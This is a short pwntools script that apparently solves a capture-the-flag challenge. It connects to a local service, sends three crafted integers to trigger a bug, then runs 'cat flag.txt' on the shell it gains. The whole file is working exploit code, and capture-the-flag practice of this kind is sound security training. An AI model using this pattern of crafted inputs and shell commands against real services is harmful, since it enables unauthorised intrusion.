from pwn import *
a = 10000000
b = 11923568
c = -600161
# p = process("./chal")
p = remote("127.0.0.1", 5000)
s = lambda x: p.sendlineafter(b"> ", str(x).encode())

s(a)
s(b)
s(c)
p.sendline(b'cat flag.txt && exit')
print(p.recvall(timeout=1))
